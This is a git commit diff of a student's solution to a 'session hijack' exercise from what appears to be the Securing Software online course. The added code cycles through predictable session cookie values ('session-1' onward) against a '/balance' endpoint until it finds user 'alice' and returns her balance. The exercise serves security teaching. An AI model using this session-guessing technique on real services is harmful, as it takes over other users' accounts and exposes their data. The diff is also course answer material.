0f235739ee90749be0bd5f3ba2ffc7f546f8eefc
aliYuksekkaya <alisyuksekkaya@gmail.com>
2021-05-31 14:31:25 -0400

    part2-13

--- mooc-securing-software-21/part2-13.sessionhijack/src/hijacksession.py
+++ mooc-securing-software-21/part2-13.sessionhijack/src/hijacksession.py
@@ -4,20 +4,27 @@ import json
 
 
 def test_session(address):
-	# write your code here
-	return None
+    # write your code here
+    url = address + '/balance'
+
+    for i in range(1, 12):
+        x = requests.get(url, cookies={"sessionid": "session-" + str(i)})
+        user_information = x.json()
+        if user_information['username'] == 'alice':
+            return user_information['balance']
+
 
 
 
 def main(argv):
-	address = sys.argv[1]
-	print(test_session(address))
+    address = sys.argv[1]
+    print(test_session(address))
 
 
 # This makes sure the main function is not called immediatedly
 # when TMC imports this module
-if __name__ == "__main__": 
-	if len(sys.argv) != 2:
-		print('usage: python %s address' % sys.argv[0])
-	else:
-		main(sys.argv)
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print('usage: python %s address' % sys.argv[0])
+    else:
+        main(sys.argv)
